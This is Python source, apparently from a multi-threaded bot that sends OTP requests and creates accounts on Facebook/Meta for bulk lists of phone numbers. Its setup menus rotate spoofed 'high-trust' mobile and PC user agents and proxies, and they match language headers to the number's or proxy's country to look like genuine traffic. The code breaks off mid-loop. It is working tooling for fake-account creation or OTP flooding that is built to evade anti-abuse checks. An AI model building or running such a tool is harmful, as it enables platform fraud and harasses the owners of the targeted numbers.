def get_random_profile_ua():
    """Dynamically get a high-trust Mobile Android / iOS / Katana browser user agent profile."""
    profiles = [
        get_fb_katana_android_ua,
        get_android_12_15,
        get_android_7_11,
        get_ios_new,
    ]
    return random.choice(profiles)()


# Setup menus

def setup_user_agent(setting_key="api_settings"):
    """Interactive user-agent profile selection menu (All 24 Windows PC Browsers)."""
    clear_logo()

    ua_map = {
        '1': get_pc_chrome, '01': get_pc_chrome,
        '2': get_pc_edge, '02': get_pc_edge,
        '3': get_pc_firefox, '03': get_pc_firefox,
        '4': get_pc_opera, '04': get_pc_opera,
        '5': get_pc_brave, '05': get_pc_brave,
        '6': get_pc_vivaldi, '06': get_pc_vivaldi,
        '7': get_pc_yandex, '07': get_pc_yandex,
        '8': get_pc_waterfox, '08': get_pc_waterfox,
        '9': get_pc_chromium, '09': get_pc_chromium,
        '10': get_pc_maxthon,
        '11': get_pc_avast,
        '12': get_pc_comodo,
        '13': get_pc_tor,
        '14': get_pc_uc,
        '15': get_pc_palemoon,
        '16': get_pc_seamonkey,
        '17': get_pc_cent,
        '18': get_pc_slimjet,
        '19': get_pc_360,
        '20': get_pc_epic,
        '21': get_pc_midori,
        '22': get_pc_sogou,
        '23': get_pc_qq,
        '24': get_pc_falkon,
        '25': get_random_profile_ua,
    }

    settings = load_settings(setting_key)
    ua_set = settings.get("user_agent_settings", {})
    ask_ua = ua_set.get("ask_for_user_agent", True)
    def_ua = str(ua_set.get("default_user_agent", "none")).strip().lower()

    if def_ua in ua_map:
        choice = def_ua
        print(f"{GREEN} [{RED}●{GREEN}] Default User-Agent Selected {EKL} {choice}")
    elif def_ua in ["random", "25", "rotate"]:
        choice = '25'
        print(f"{GREEN} [{RED}●{GREEN}] Default User-Agent Selected {EKL} Random 24 Windows PC Browsers (Rotate)")
    else:
        if ask_ua:
            print(f" {opt_labels[0]} Windows PC Chrome (10 / 11)")
            print(f" {opt_labels[1]} Windows PC Microsoft Edge")
            print(f" {opt_labels[2]} Windows PC Mozilla Firefox")
            print(f" {opt_labels[3]} Windows PC Opera / Opera GX")
            print(f" {opt_labels[4]} Windows PC Brave Browser")
            print(f" {opt_labels[5]} Windows PC Vivaldi Browser")
            print(f" {opt_labels[6]} Windows PC Yandex Browser")
            print(f" {opt_labels[7]} Windows PC Waterfox Browser")
            print(f" {opt_labels[8]} Windows PC Chromium")
            print(f" {opt_labels[9]} Windows PC Maxthon Browser")
            print(f" {opt_labels[10]} Windows PC Avast Secure Browser")
            print(f" {opt_labels[11]} Windows PC Comodo Dragon")
            print(f" [{GREEN}13{WHITE}] Windows PC Tor Browser / Firefox ESR")
            print(f" [{GREEN}14{WHITE}] Windows PC UC Browser")
            print(f" [{GREEN}15{WHITE}] Windows PC Pale Moon")
            print(f" [{GREEN}16{WHITE}] Windows PC SeaMonkey")
            print(f" [{GREEN}17{WHITE}] Windows PC Cent Browser")
            print(f" [{GREEN}18{WHITE}] Windows PC Slimjet Browser")
            print(f" [{GREEN}19{WHITE}] Windows PC 360 Speed Browser")
            print(f" [{GREEN}20{WHITE}] Windows PC Epic Privacy Browser")
            print(f" [{GREEN}21{WHITE}] Windows PC Midori Browser")
            print(f" [{GREEN}22{WHITE}] Windows PC Sogou Explorer")
            print(f" [{GREEN}23{WHITE}] Windows PC QQ Browser")
            print(f" [{GREEN}24{WHITE}] Windows PC Falkon Browser")
            print(f" [{GREEN}25{WHITE}] Random / Rotate ALL 24 Windows PC Browsers (Recommended)")
            print(f"{LINE}")
            choice = input(f"{GREEN} [{RED}●{GREEN}] Select User-Agent {EKL} ").strip()
        else:
            choice = '25'
            print(f"{GREEN} [{RED}●{GREEN}] Using Random 24 Windows PC Rotation due to config")

    ua_func = ua_map.get(choice)
    if not ua_func:
        ua_func = get_random_profile_ua
    return ua_func

def setup_proxies(setting_key="api_settings"):
    """Choose connection mode and setup proxies if selected."""
    clear_logo()
    settings = load_settings(setting_key)
    proxy_set = settings.get("proxy_settings", {})
    ask_proxy = proxy_set.get("ask_for_proxy", True)
    
    use_proxy = False
    if ask_proxy:
        print(f" {opt_labels[0]} Real IP (Direct Connection)")
        print(f" {opt_labels[1]} Proxy (Use Proxy List / Settings)")
        print(f"{LINE}")
        choice = input(f"{GREEN} [{RED}●{GREEN}] Select Connection Mode {EKL} ").strip()
        if choice in ['2', '02']:
            use_proxy = True
        else:
            use_proxy = False
    else:
        # If ask_for_proxy is False, automatically use proxy if it's available
        has_txt = os.path.exists("Proxy_List.txt") and os.path.getsize("Proxy_List.txt") > 0
        def_proxy = proxy_set.get("default_proxy", "")
        if has_txt or def_proxy:
            use_proxy = True
        else:
            use_proxy = False

    if use_proxy:
        PROXY_LIST = get_proxy_list(settings_key=setting_key)
        PROXY_ITERATOR = itertools.cycle(PROXY_LIST) if PROXY_LIST else None
        if PROXY_LIST:
            print(f"{GREEN} [{RED}●{GREEN}] Total Proxies {EKL} {len(PROXY_LIST)}")
        else:
            print(f"{YELLOW} No active proxies working. Proceeding with Real IP / VPN connection.")
        return PROXY_LIST, PROXY_ITERATOR
    else:
        print(f"{GREEN} [{RED}●{GREEN}] Connection Mode {EKL} Real IP (Direct)")
        time.sleep(1)
        return [], None

def setup_browser(setting_key="selenium_settings"):
    """Interactive browser selection menu for Selenium mode."""
    clear_logo()
    settings = load_settings(setting_key)
    browser_set = settings.get("browser_settings", {})
    ask_browser = browser_set.get("ask_for_browser", True)
    def_browser = str(browser_set.get("default_browser", "chrome")).strip().lower()

    if not ask_browser:
        choice = def_browser
        print(f"{GREEN} [{RED}●{GREEN}] Default Browser Selected {EKL} {choice}")
    else:
        print(f" {opt_labels[0]} Google Chrome (Default)")
        print(f" {opt_labels[1]} Microsoft Edge")
        print(f" {opt_labels[2]} Mozilla Firefox")
        print(f" {opt_labels[3]} Brave Browser")
        print(f" {opt_labels[4]} Opera Browser\n{LINE}")

        choice = input(f"{GREEN} [{RED}●{GREEN}] Select Browser {EKL} ").strip()

    if choice in ['2', '02', 'edge']:
        return 'edge'
    elif choice in ['3', '03', 'firefox']:
        return 'firefox'
    elif choice in ['4', '04', 'brave']:
        return 'brave'
    elif choice in ['5', '05', 'opera']:
        return 'opera'
    else:
        return 'chrome'

def setup_headless_mode(setting_key="selenium_settings"):
    """Interactive headless mode selection."""
    clear_logo()
    settings = load_settings(setting_key)
    headless_set = settings.get("headless_settings", {})
    ask_headless = headless_set.get("ask_for_headless", True)
    def_headless = headless_set.get("default_headless", False)

    if not ask_headless:
        print(f"{GREEN} [{RED}●{GREEN}] Headless Mode {EKL} {def_headless} (From Config)")
        return bool(def_headless)
    else:
        print(f" {opt_labels[0]} Visible (UI Open)")
        print(f" {opt_labels[1]} Headless (Background)\n{LINE}")
        h_choice = input(f"{GREEN} [{RED}●{GREEN}] Select Mode {EKL} ").strip()
        return True if h_choice in ['2', '02'] else False

def setup_start_route(setting_key="selenium_settings"):
    """Choose between starting from Meta AI homepage or auth page directly."""
    clear_logo()
    settings = load_settings(setting_key)
    route_set = settings.get("route_settings", {})
    ask_route = route_set.get("ask_for_route", True)
    try:
        def_route = int(route_set.get("default_route", 0))
    except:
        def_route = 0

    if not ask_route:
        print(f"{GREEN} [{RED}●{GREEN}] Start Route {EKL} {def_route} (From Config)")
        return def_route
    else:
        print(f" {opt_labels[0]} Start from Home (Default)")
        print(f" {opt_labels[1]} Start from Auth Page\n{LINE}")
        route_choice = input(f"{GREEN} [{RED}●{GREEN}] Select Starting Route {EKL} ").strip()
        return 1 if route_choice in ['2', '02'] else 0

def setup_work_mode(setting_key="selenium_settings"):
    """Choose between Both / Resend-Only / Create-Only work modes."""
    clear_logo()
    settings = load_settings(setting_key)
    work_set = settings.get("work_mode", {})
    ask_mode = work_set.get("ask_for_mode", True)
    try:
        def_mode = int(work_set.get("default_mode", 0))
    except:
        def_mode = 0

    work_mode = def_mode
    if not ask_mode:
        print(f"{GREEN} [{RED}●{GREEN}] Work Mode {EKL} {def_mode} (From Config)")
    else:
        print(f" {opt_labels[0]} Both (Resend + Create)")
        print(f" {opt_labels[1]} Resend Only (Ignore Create New Account)")
        print(f" {opt_labels[2]} Create Only (Ignore Existing Accounts)\n{LINE}")
        wm = input(f"{GREEN} [{RED}●{GREEN}] Select Work Mode [Enter for Default] {EKL} ").strip()
        if wm in ['0', '1', '01']:
            work_mode = 0
        elif wm in ['2', '02']:
            work_mode = 1
        elif wm in ['3', '03']:
            work_mode = 2
    return work_mode

def setup_otp_resend(setting_key="api_settings"):
    """Configure OTP resend count."""
    clear_logo()
    settings = load_settings(setting_key)
    otp_set = settings.get("otp_settings", {})
    ask_resend = otp_set.get("ask_for_resend_count", True)
    try:
        def_resend = int(otp_set.get("default_resend_count", 1))
    except:
        def_resend = 1

    if not ask_resend:
        resend_count = def_resend
        print(f"{GREEN} [{RED}●{GREEN}] Resend OTP Count {EKL} {resend_count} (From Config)")
    else:
        print(f"{WHITE} How many times to Resend OTP? (0 to disable Resend)")
        r_inp = input(f"{GREEN} [{RED}●{GREEN}] Resend Count [Default: {def_resend}] {EKL} ").strip()
        try:
            resend_count = int(r_inp) if r_inp else def_resend
        except:
            resend_count = def_resend
            print(f"{RED} Invalid input. Using Default {EKL} {resend_count}")
        print(f"{GREEN} [{RED}●{GREEN}] Resend OTP Set to {EKL} {resend_count}")

    return resend_count

def setup_threads(setting_key="api_settings"):
    """Configure the number of worker threads."""
    settings = load_settings(setting_key)
    thread_set = settings.get("thread_settings", {})
    ask_threads = thread_set.get("ask_for_threads", True)
    try:
        def_threads = int(thread_set.get("default_threads", 20))
    except:
        def_threads = 20

    if not ask_threads:
        print(f"{GREEN} [{RED}●{GREEN}] Threads {EKL} {def_threads} (From Config)")
        return def_threads

    try:
        w_inp = input(f"{LINE}\n{GREEN} [{RED}●{GREEN}] Enter number of Threads/Workers [{def_threads}] {EKL} ").strip()
        if w_inp:
            return int(w_inp)
        else:
            return def_threads
    except:
        return def_threads

def display_final_summary():
    """Print the final processing summary after all numbers are done."""
    with print_lock:
        sys.stdout.write('\r' + ' ' * 80 + '\r')
        sys.stdout.flush()
    print(f"\n{LINE}")
    print(f"{GREEN} [{RED}●{GREEN}] {WHITE}Completed Processing {total_checked} Numbers.")
    print(f"{GREEN} [{RED}●{GREEN}] {GREEN}Total Success {EKL} {total_success}")
    print(f"{GREEN} [{RED}●{GREEN}] {YELLOW}Total Failed  {EKL} {total_failed}")
    print(f"{GREEN} [{RED}●{GREEN}] {RED}Total Error   {EKL} {total_error}")
    print(f"{LINE}")
    settings = load_settings("api_settings")
    if not settings.get("file_input_settings", {}).get("always_use_txt", False):
        input(f"{WHITE} Press Enter to exit...")

_PREFIX_TO_COUNTRY = {
    # North America
    "1":   {"lang": "en-US,en;q=0.9", "country": "US", "browser_lang": ["en-US", "en"]},
    "52":  {"lang": "es-MX,es;q=0.9,en-US;q=0.8", "country": "MX", "browser_lang": ["es-MX", "es", "en-US"]},
    
    # South America
    "55":  {"lang": "pt-BR,pt;q=0.9,en-US;q=0.8", "country": "BR", "browser_lang": ["pt-BR", "pt", "en-US"]},
    "54":  {"lang": "es-AR,es;q=0.9,en-US;q=0.8", "country": "AR", "browser_lang": ["es-AR", "es", "en-US"]},
    "57":  {"lang": "es-CO,es;q=0.9,en-US;q=0.8", "country": "CO", "browser_lang": ["es-CO", "es", "en-US"]},
    "51":  {"lang": "es-PE,es;q=0.9,en-US;q=0.8", "country": "PE", "browser_lang": ["es-PE", "es", "en-US"]},
    "56":  {"lang": "es-CL,es;q=0.9,en-US;q=0.8", "country": "CL", "browser_lang": ["es-CL", "es", "en-US"]},
    "58":  {"lang": "es-VE,es;q=0.9,en-US;q=0.8", "country": "VE", "browser_lang": ["es-VE", "es", "en-US"]},
    "593": {"lang": "es-EC,es;q=0.9,en-US;q=0.8", "country": "EC", "browser_lang": ["es-EC", "es", "en-US"]},
    "591": {"lang": "es-BO,es;q=0.9,en-US;q=0.8", "country": "BO", "browser_lang": ["es-BO", "es", "en-US"]},
    "595": {"lang": "es-PY,es;q=0.9,en-US;q=0.8", "country": "PY", "browser_lang": ["es-PY", "es", "en-US"]},
    "598": {"lang": "es-UY,es;q=0.9,en-US;q=0.8", "country": "UY", "browser_lang": ["es-UY", "es", "en-US"]},

    # Europe
    "44":  {"lang": "en-GB,en;q=0.9,en-US;q=0.8", "country": "GB", "browser_lang": ["en-GB", "en", "en-US"]},
    "33":  {"lang": "fr-FR,fr;q=0.9,en-US;q=0.8", "country": "FR", "browser_lang": ["fr-FR", "fr", "en-US"]},
    "49":  {"lang": "de-DE,de;q=0.9,en-US;q=0.8", "country": "DE", "browser_lang": ["de-DE", "de", "en-US"]},
    "39":  {"lang": "it-IT,it;q=0.9,en-US;q=0.8", "country": "IT", "browser_lang": ["it-IT", "it", "en-US"]},
    "34":  {"lang": "es-ES,es;q=0.9,en-US;q=0.8", "country": "ES", "browser_lang": ["es-ES", "es", "en-US"]},
    "31":  {"lang": "nl-NL,nl;q=0.9,en-US;q=0.8", "country": "NL", "browser_lang": ["nl-NL", "nl", "en-US"]},
    "32":  {"lang": "nl-BE,nl;q=0.9,fr;q=0.8,en-US;q=0.7", "country": "BE", "browser_lang": ["nl-BE", "nl", "fr", "en-US"]},
    "41":  {"lang": "de-CH,de;q=0.9,fr;q=0.8,it;q=0.7", "country": "CH", "browser_lang": ["de-CH", "de", "fr", "it"]},
    "43":  {"lang": "de-AT,de;q=0.9,en-US;q=0.8", "country": "AT", "browser_lang": ["de-AT", "de", "en-US"]},
    "46":  {"lang": "sv-SE,sv;q=0.9,en-US;q=0.8", "country": "SE", "browser_lang": ["sv-SE", "sv", "en-US"]},
    "47":  {"lang": "no-NO,no;q=0.9,en-US;q=0.8", "country": "NO", "browser_lang": ["no-NO", "no", "en-US"]},
    "45":  {"lang": "da-DK,da;q=0.9,en-US;q=0.8", "country": "DK", "browser_lang": ["da-DK", "da", "en-US"]},
    "358": {"lang": "fi-FI,fi;q=0.9,en-US;q=0.8", "country": "FI", "browser_lang": ["fi-FI", "fi", "en-US"]},
    "48":  {"lang": "pl-PL,pl;q=0.9,en-US;q=0.8", "country": "PL", "browser_lang": ["pl-PL", "pl", "en-US"]},
    "420": {"lang": "cs-CZ,cs;q=0.9,en-US;q=0.8", "country": "CZ", "browser_lang": ["cs-CZ", "cs", "en-US"]},
    "351": {"lang": "pt-PT,pt;q=0.9,en-US;q=0.8", "country": "PT", "browser_lang": ["pt-PT", "pt", "en-US"]},
    "30":  {"lang": "el-GR,el;q=0.9,en-US;q=0.8", "country": "GR", "browser_lang": ["el-GR", "el", "en-US"]},
    "36":  {"lang": "hu-HU,hu;q=0.9,en-US;q=0.8", "country": "HU", "browser_lang": ["hu-HU", "hu", "en-US"]},
    "7":   {"lang": "ru-RU,ru;q=0.9,en-US;q=0.8", "country": "RU", "browser_lang": ["ru-RU", "ru", "en-US"]},
    "380": {"lang": "uk-UA,uk;q=0.9,ru;q=0.8,en-US;q=0.7", "country": "UA", "browser_lang": ["uk-UA", "uk", "ru", "en-US"]},
    "375": {"lang": "be-BY,be;q=0.9,ru;q=0.8,en-US;q=0.7", "country": "BY", "browser_lang": ["be-BY", "be", "ru", "en-US"]},

    # Asia & Middle East
    "86":  {"lang": "zh-CN,zh;q=0.9,en-US;q=0.8", "country": "CN", "browser_lang": ["zh-CN", "zh", "en-US"]},
    "91":  {"lang": "hi-IN,hi;q=0.9,en-US;q=0.8", "country": "IN", "browser_lang": ["hi-IN", "hi", "en-US"]},
    "81":  {"lang": "ja-JP,ja;q=0.9,en-US;q=0.8", "country": "JP", "browser_lang": ["ja-JP", "ja", "en-US"]},
    "82":  {"lang": "ko-KR,ko;q=0.9,en-US;q=0.8", "country": "KR", "browser_lang": ["ko-KR", "ko", "en-US"]},
    "62":  {"lang": "id-ID,id;q=0.9,en-US;q=0.8", "country": "ID", "browser_lang": ["id-ID", "id", "en-US"]},
    "92":  {"lang": "ur-PK,ur;q=0.9,en-US;q=0.8", "country": "PK", "browser_lang": ["ur-PK", "ur", "en-US"]},
    "880": {"lang": "bn-BD,bn;q=0.9,en-US;q=0.8", "country": "BD", "browser_lang": ["bn-BD", "bn", "en-US"]},
    "84":  {"lang": "vi-VN,vi;q=0.9,en-US;q=0.8", "country": "VN", "browser_lang": ["vi-VN", "vi", "en-US"]},
    "66":  {"lang": "th-TH,th;q=0.9,en-US;q=0.8", "country": "TH", "browser_lang": ["th-TH", "th", "en-US"]},
    "63":  {"lang": "fil-PH,fil;q=0.9,en-US;q=0.8", "country": "PH", "browser_lang": ["fil-PH", "fil", "en-US"]},
    "60":  {"lang": "ms-MY,ms;q=0.9,en-US;q=0.8", "country": "MY", "browser_lang": ["ms-MY", "ms", "en-US"]},
    "95":  {"lang": "my-MM,my;q=0.9,en-US;q=0.8", "country": "MM", "browser_lang": ["my-MM", "my", "en-US"]},
    "94":  {"lang": "si-LK,si;q=0.9,en-US;q=0.8", "country": "LK", "browser_lang": ["si-LK", "si", "en-US"]},
    "977": {"lang": "ne-NP,ne;q=0.9,en-US;q=0.8", "country": "NP", "browser_lang": ["ne-NP", "ne", "en-US"]},
    "98":  {"lang": "fa-IR,fa;q=0.9,en-US;q=0.8", "country": "IR", "browser_lang": ["fa-IR", "fa", "en-US"]},
    "966": {"lang": "ar-SA,ar;q=0.9,en-US;q=0.8", "country": "SA", "browser_lang": ["ar-SA", "ar", "en-US"]},
    "971": {"lang": "ar-AE,ar;q=0.9,en-US;q=0.8", "country": "AE", "browser_lang": ["ar-AE", "ar", "en-US"]},
    "972": {"lang": "he-IL,he;q=0.9,en-US;q=0.8", "country": "IL", "browser_lang": ["he-IL", "he", "en-US"]},
    "90":  {"lang": "tr-TR,tr;q=0.9,en-US;q=0.8", "country": "TR", "browser_lang": ["tr-TR", "tr", "en-US"]},
    "998": {"lang": "uz-UZ,uz;q=0.9,ru;q=0.8,en-US;q=0.7", "country": "UZ", "browser_lang": ["uz-UZ", "uz", "ru", "en-US"]},
    "93":  {"lang": "fa-AF,fa;q=0.9,ps;q=0.8,en-US;q=0.7", "country": "AF", "browser_lang": ["fa-AF", "fa", "ps", "en-US"]},
    "964": {"lang": "ar-IQ,ar;q=0.9,en-US;q=0.8", "country": "IQ", "browser_lang": ["ar-IQ", "ar", "en-US"]},
    "962": {"lang": "ar-JO,ar;q=0.9,en-US;q=0.8", "country": "JO", "browser_lang": ["ar-JO", "ar", "en-US"]},
    "961": {"lang": "ar-LB,ar;q=0.9,en-US;q=0.8", "country": "LB", "browser_lang": ["ar-LB", "ar", "en-US"]},
    "965": {"lang": "ar-KW,ar;q=0.9,en-US;q=0.8", "country": "KW", "browser_lang": ["ar-KW", "ar", "en-US"]},
    "974": {"lang": "ar-QA,ar;q=0.9,en-US;q=0.8", "country": "QA", "browser_lang": ["ar-QA", "ar", "en-US"]},
    "973": {"lang": "ar-BH,ar;q=0.9,en-US;q=0.8", "country": "BH", "browser_lang": ["ar-BH", "ar", "en-US"]},
    "968": {"lang": "ar-OM,ar;q=0.9,en-US;q=0.8", "country": "OM", "browser_lang": ["ar-OM", "ar", "en-US"]},
    "963": {"lang": "ar-SY,ar;q=0.9,en-US;q=0.8", "country": "SY", "browser_lang": ["ar-SY", "ar", "en-US"]},
    "967": {"lang": "ar-YE,ar;q=0.9,en-US;q=0.8", "country": "YE", "browser_lang": ["ar-YE", "ar", "en-US"]},

    # Africa
    "20":  {"lang": "ar-EG,ar;q=0.9,en-US;q=0.8", "country": "EG", "browser_lang": ["ar-EG", "ar", "en-US"]},
    "212": {"lang": "ar-MA,ar;q=0.9,fr;q=0.8",   "country": "MA", "browser_lang": ["ar-MA", "ar", "fr"]},
    "213": {"lang": "ar-DZ,ar;q=0.9,fr;q=0.8",   "country": "DZ", "browser_lang": ["ar-DZ", "ar", "fr"]},
    "216": {"lang": "ar-TN,ar;q=0.9,fr;q=0.8",   "country": "TN", "browser_lang": ["ar-TN", "ar", "fr"]},
    "234": {"lang": "en-NG,en;q=0.9",             "country": "NG", "browser_lang": ["en-NG", "en"]},
    "27":  {"lang": "en-ZA,en;q=0.9,af;q=0.8",   "country": "ZA", "browser_lang": ["en-ZA", "en", "af"]},
    "254": {"lang": "sw-KE,sw;q=0.9,en-US;q=0.8", "country": "KE", "browser_lang": ["sw-KE", "sw", "en-US"]},
    "255": {"lang": "sw-TZ,sw;q=0.9,en-US;q=0.8", "country": "TZ", "browser_lang": ["sw-TZ", "sw", "en-US"]},
    "256": {"lang": "en-UG,en;q=0.9,sw;q=0.8",   "country": "UG", "browser_lang": ["en-UG", "en", "sw"]},
    "233": {"lang": "en-GH,en;q=0.9",             "country": "GH", "browser_lang": ["en-GH", "en"]},
    "251": {"lang": "am-ET,am;q=0.9,en-US;q=0.8", "country": "ET", "browser_lang": ["am-ET", "am", "en-US"]},
    "218": {"lang": "ar-LY,ar;q=0.9,en-US;q=0.8", "country": "LY", "browser_lang": ["ar-LY", "ar", "en-US"]},
    "249": {"lang": "ar-SD,ar;q=0.9,en-US;q=0.8", "country": "SD", "browser_lang": ["ar-SD", "ar", "en-US"]},
    "221": {"lang": "fr-SN,fr;q=0.9,en-US;q=0.8", "country": "SN", "browser_lang": ["fr-SN", "fr", "en-US"]},
    "225": {"lang": "fr-CI,fr;q=0.9,en-US;q=0.8", "country": "CI", "browser_lang": ["fr-CI", "fr", "en-US"]},
    "237": {"lang": "fr-CM,fr;q=0.9,en-US;q=0.8", "country": "CM", "browser_lang": ["fr-CM", "fr", "en-US"]},
    "244": {"lang": "pt-AO,pt;q=0.9,en-US;q=0.8", "country": "AO", "browser_lang": ["pt-AO", "pt", "en-US"]},
    "258": {"lang": "pt-MZ,pt;q=0.9,en-US;q=0.8", "country": "MZ", "browser_lang": ["pt-MZ", "pt", "en-US"]},
    "260": {"lang": "en-ZM,en;q=0.9",             "country": "ZM", "browser_lang": ["en-ZM", "en"]},
    "263": {"lang": "en-ZW,en;q=0.9",             "country": "ZW", "browser_lang": ["en-ZW", "en"]},
    "250": {"lang": "rw-RW,rw;q=0.9,fr;q=0.8",   "country": "RW", "browser_lang": ["rw-RW", "rw", "fr", "en-US"]},
    "261": {"lang": "mg-MG,mg;q=0.9,fr;q=0.8",   "country": "MG", "browser_lang": ["mg-MG", "mg", "fr", "en-US"]},
    "252": {"lang": "so-SO,so;q=0.9,ar;q=0.8",   "country": "SO", "browser_lang": ["so-SO", "so", "ar", "en-US"]},
    
    # Oceania
    "61":  {"lang": "en-AU,en;q=0.9,en-US;q=0.8", "country": "AU", "browser_lang": ["en-AU", "en", "en-US"]},
    "64":  {"lang": "en-NZ,en;q=0.9,en-US;q=0.8", "country": "NZ", "browser_lang": ["en-NZ", "en", "en-US"]},
    "679": {"lang": "en-FJ,en;q=0.9",             "country": "FJ", "browser_lang": ["en-FJ", "en"]},
    "675": {"lang": "en-PG,en;q=0.9",             "country": "PG", "browser_lang": ["en-PG", "en"]},
}

SELECTED_LANGUAGE_HEADER = None

def setup_language(setting_key="api_settings"):
    """Interactive language selection menu for OTP requests."""
    global SELECTED_LANGUAGE_HEADER
    clear_logo()

    lang_options = [
        ("Auto Match (Proxy/Number Country)", "auto"),
        ("Arabic - Egypt (ar-EG)", "ar-EG,ar;q=0.9,en-US;q=0.8", "EG"),
        ("Arabic - Saudi Arabia (ar-SA)", "ar-SA,ar;q=0.9,en-US;q=0.8", "SA"),
        ("Arabic - UAE (ar-AE)", "ar-AE,ar;q=0.9,en-US;q=0.8", "AE"),
        ("Arabic - Algeria (ar-DZ)", "ar-DZ,ar;q=0.9,fr;q=0.8", "DZ"),
        ("Arabic - Morocco (ar-MA)", "ar-MA,ar;q=0.9,fr;q=0.8", "MA"),
        ("Bengali - Bangladesh (bn-BD)", "bn-BD,bn;q=0.9,en-US;q=0.8", "BD"),
        ("English - US (en-US)", "en-US,en;q=0.9", "US"),
        ("English - UK (en-GB)", "en-GB,en;q=0.9", "GB"),
        ("French - France (fr-FR)", "fr-FR,fr;q=0.9,en-US;q=0.8", "FR"),
        ("Russian - Russia (ru-RU)", "ru-RU,ru;q=0.9,en-US;q=0.8", "RU"),
        ("Portuguese - Brazil (pt-BR)", "pt-BR,pt;q=0.9,en-US;q=0.8", "BR"),
        ("Spanish - Mexico (es-MX)", "es-MX,es;q=0.9,en-US;q=0.8", "MX"),
        ("Turkish - Turkey (tr-TR)", "tr-TR,tr;q=0.9,en-US;q=0.8", "TR"),
        ("Hindi - India (hi-IN)", "hi-IN,hi;q=0.9,en-US;q=0.8", "IN"),
        ("Random / Rotate Languages", "random")
    ]

    settings = load_settings(setting_key)
    lang_set = settings.get("language_settings", {})
    ask_lang = lang_set.get("ask_for_language", True)
    def_lang = str(lang_set.get("default_language", "auto")).strip().lower()

    if not ask_lang:
        if def_lang == "auto":
            SELECTED_LANGUAGE_HEADER = None
            print(f"{GREEN} [{RED}●{GREEN}] Language Selected {EKL} Auto Match (Proxy/Number Country)")
        else:
            SELECTED_LANGUAGE_HEADER = def_lang
            print(f"{GREEN} [{RED}●{GREEN}] Language Selected {EKL} {def_lang}")
        return

    print(f"{WHITE} Select Language for OTP requests:")
    for idx, (label, val, *rest) in enumerate(lang_options):
        print(f" [{GREEN}{idx+1:02d}{WHITE}] {label}")
    print(f"{LINE}")

    choice = input(f"{GREEN} [{RED}●{GREEN}] Select Language [Default: 01 Auto] {EKL} ").strip()
    if not choice or choice in ['1', '01']:
        SELECTED_LANGUAGE_HEADER = None
        print(f"{GREEN} [{RED}●{GREEN}] Language Selected {EKL} Auto Match")
    else:
        try:
            c_idx = int(choice) - 1
            if 0 <= c_idx < len(lang_options):
                opt = lang_options[c_idx]
                if opt[1] == "auto":
                    SELECTED_LANGUAGE_HEADER = None
                elif opt[1] == "random":
                    SELECTED_LANGUAGE_HEADER = "random"
                else:
                    SELECTED_LANGUAGE_HEADER = (opt[1], opt[2])
                print(f"{GREEN} [{RED}●{GREEN}] Language Selected {EKL} {opt[0]}")
            else:
                SELECTED_LANGUAGE_HEADER = None
                print(f"{YELLOW} Invalid selection. Defaulting to Auto Match.")
        except Exception:
            SELECTED_LANGUAGE_HEADER = None

def get_locale_for_proxy(proxy_data=None, phone_number=None):
    global SELECTED_LANGUAGE_HEADER

    # Handle manual language selection
    if SELECTED_LANGUAGE_HEADER:
        if SELECTED_LANGUAGE_HEADER == "random":
            item = random.choice(list(_PREFIX_TO_COUNTRY.values()))
            return item["lang"], item["country"], item["browser_lang"]
        elif isinstance(SELECTED_LANGUAGE_HEADER, tuple):
            lang_str, c_code = SELECTED_LANGUAGE_HEADER
            return lang_str, c_code, [lang_str.split(',')[0]]

    # 1. Target phone number prefix match (e.g. UZ for +998, DZ for +213, ET for +251)
    if phone_number:
        clean_num = phone_number.replace('+', '').replace('-', '').replace(' ', '')
        for prefix, data in sorted(_PREFIX_TO_COUNTRY.items(), key=lambda x: len(x[0]), reverse=True):
            if clean_num.startswith(prefix):
                return data["lang"], data["country"], data["browser_lang"]

    # 2. Try to determine country from proxy IP or proxy object metadata (matching request headers with proxy IP origin)
    proxy_country = None
    if proxy_data:
        if isinstance(proxy_data, dict) and 'country' in proxy_data and proxy_data['country'] != 'Unknown':
            proxy_country = proxy_data['country']

    if proxy_country:
        for prefix, data in _PREFIX_TO_COUNTRY.items():
            if data["country"] == proxy_country:
                return data["lang"], data["country"], data["browser_lang"]

    # Ultimate fallback: Random selection if nothing else works
    item = random.choice(list(_PREFIX_TO_COUNTRY.values()))
    return item["lang"], item["country"], item["browser_lang"]


import urllib.parse
import re

def safe_get(session, url, headers=None, timeout=15):
    """Safely execute GET requests handling fbredirect:// and custom mobile scheme redirects."""
    curr_url = url
    resp = None
    for _ in range(10):
        try:
            resp = session.get(curr_url, headers=headers, allow_redirects=False, timeout=timeout)
        except Exception as e:
            err_str = str(e)
            if "fbredirect://" in err_str:
                match = re.search(r"uri=([^\'&]+)", err_str)
                if match:
                    curr_url = urllib.parse.unquote(match.group(1))
                    continue
            raise e

        if resp.status_code in [301, 302, 303, 307, 308]:
            loc = resp.headers.get("Location") or resp.headers.get("location") or ""
            if loc.startswith("fbredirect://"):
                match = re.search(r"uri=([^&]+)", loc)
                if match:
                    curr_url = urllib.parse.unquote(match.group(1))
                    continue
                else:
                    curr_url = loc.replace("fbredirect://", "https://")
                    continue
            elif loc.startswith("/"):
                curr_url = f"https://m.facebook.com{loc}"
                continue
            elif loc.startswith("http"):
                curr_url = loc
                continue
        return resp
    return resp




# ========================================
# api_bot.py
# ========================================
import os
import sys
import time
import random
import string
import uuid
import requests
import json
import re
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse, parse_qs


if sys.platform == "win32":
    sys.stdout.reconfigure(encoding='utf-8')
    os.system('')


def run():
    """Entry point for API automation mode."""
    clear_logo()
    numbers = file_input("api_settings")
    if not numbers:
        input(f"{WHITE} Press Enter to exit...")
        return

    ua_func = setup_user_agent("api_settings")
    if not ua_func: return

    PROXY_LIST, PROXY_ITERATOR = setup_proxies("api_settings")
    setup_language("api_settings")
    resend_count = setup_otp_resend("api_settings")
    max_workers = setup_threads("api_settings")

    clear_logo()
    reset_counters()
    set_total_numbers(len(numbers))
    print(f"{GREEN} [{RED}●{GREEN}] Total Numbers  {EKL} {len(numbers)}")
    print(f"{GREEN} [{RED}●{GREEN}] Threads         {EKL} {max_workers}")
    print(f"{GREEN} [{RED}●{GREEN}] Proxies         {EKL} {len(PROXY_LIST) if PROXY_LIST else 'None'}")
    print(f"{LINE}")

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        remaining_numbers = list(numbers)

        def make_callback(n):
            def callback(future):
                with file_lock:
                    if n in remaining_numbers:
                        remaining_numbers.remove(n)
                save_remaining_numbers(remaining_numbers)
            return callback

        for num in numbers:
